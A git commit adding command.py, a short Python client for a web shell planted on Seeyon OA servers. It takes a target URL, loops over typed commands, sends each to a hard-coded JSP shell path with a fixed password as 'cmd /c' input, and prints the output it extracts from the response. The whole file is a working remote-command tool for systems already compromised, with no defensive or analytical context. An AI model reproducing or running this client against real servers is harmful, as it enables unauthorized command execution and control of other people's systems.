b673e11d190ab40d11309f4ac100e60c027a6611
Miko <MikoSecSoS@gmail.com>
2019-06-27 02:00:06 +0800

    commit

---
+++ command.py
@@ -0,0 +1,26 @@
+import re
+import sys
+
+import requests
+
+from urllib.parse import unquote,quote
+
+url = [*sys.argv,][1:]
+if not url:
+    url = input('[+] Please input url：')
+else:
+    url = url[0]
+
+while 1:
+    try:
+        command = input(">>> ")
+    except:
+        print("Bye~ I Love You~~~")
+        sys.exit(1)
+    exp_url = url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+" + quote(command)
+    req = requests.get(exp_url)
+    if req.status_code == 200:
+        result = re.findall("<pre>(.*?)</pre>", req.text, re.S)[0]
+        print(result)
+    else:
+        print("[Error]", req)
